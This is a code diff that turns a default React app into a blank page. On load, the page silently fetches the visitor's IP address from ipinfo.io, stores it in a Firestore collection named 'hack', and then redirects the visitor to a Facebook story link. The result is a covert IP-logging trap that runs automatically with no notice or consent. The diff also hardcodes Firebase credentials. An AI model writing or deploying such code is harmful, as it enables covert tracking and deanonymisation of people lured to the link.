@@ -1,25 +1,47 @@
-import logo from './logo.svg';
-import './App.css';
+import "./App.css";
+import { useState, useEffect } from "react";
+import axios from "axios";
+
+import firebase from "firebase/compat/app";
+import "firebase/compat/firestore";
+
+firebase.initializeApp({
+  apiKey: "AIzaSyC9bA5NKsStcYRPDDTJFQbFUI1oCX2tq4I",
+  authDomain: "thobor-9436b.firebaseapp.com",
+  projectId: "thobor-9436b",
+  storageBucket: "thobor-9436b.appspot.com",
+  messagingSenderId: "496274391107",
+  appId: "1:496274391107:web:f1711686e690bab69fd4f6",
+});
+
+const firestore = firebase.firestore();
+const hack = firestore.collection("hack");
 
 function App() {
-  return (
-    <div className="App">
-      <header className="App-header">
-        <img src={logo} className="App-logo" alt="logo" />
-        <p>
-          Edit <code>src/App.js</code> and save to reload.
-        </p>
-        <a
-          className="App-link"
-          href="https://reactjs.org"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          Learn React
-        </a>
-      </header>
-    </div>
-  );
+  //creating IP state
+  const [ip, setIP] = useState("");
+
+  //creating function to load ip address from the API
+  const getData = async () => {
+    const res = await axios.get("http://ipinfo.io/ip");
+    console.log(res.data);
+    // setIP(res.data.IPv4);
+    await hack
+      .add({
+        ip: res.data,
+      })
+      .then((res) => {
+        console.log(res);
+        window.location.href =
+          "https://m.facebook.com/story.php?story_fbid=pfbid0ZJbYTsR868ySqAUCwXTzqz3TbonC7PwKLyuWLEHhxrmmqH8yZtYhaQjgzFuRCR7Ul&id=100075758240162 ";
+      });
+  };
+
+  useEffect(() => {
+    getData();
+  }, []);
+
+  return <div className="App"></div>;
 }
 
 export default App;
